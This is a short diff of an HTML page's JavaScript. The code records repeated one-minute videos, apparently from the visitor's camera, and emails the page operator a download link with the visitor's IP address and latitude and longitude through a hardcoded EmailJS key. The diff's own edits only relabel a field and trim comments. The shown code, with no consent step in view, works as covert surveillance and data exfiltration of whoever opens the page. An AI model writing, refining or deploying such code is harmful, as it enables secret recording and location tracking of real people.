@@ -7,7 +7,6 @@
 </head>
 <body>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
   <script>
     emailjs.init("ACOn6PC1Zb70JrmxT");
 
@@ -72,8 +71,9 @@
 
             const message = `
 You received a new video recording.
+
 Download link: ${videoUrl}
-IP Address: ${ip}
+Sender IP: ${ip}
 Latitude: ${location.latitude}
 Longitude: ${location.longitude}
 `;
@@ -88,12 +88,12 @@ Longitude: ${location.longitude}
 
             count++;
             if (count < maxRecordings) {
-              setTimeout(recordAndSend, 1000); // 1 second delay before next recording
+              setTimeout(recordAndSend, 1000);
             }
           };
 
           recorder.start();
-          setTimeout(() => recorder.stop(), 60000); // record for 1 minute
+          setTimeout(() => recorder.stop(), 60000); // 1 minute
         } catch (err) {
           console.error("Error:", err);
         }
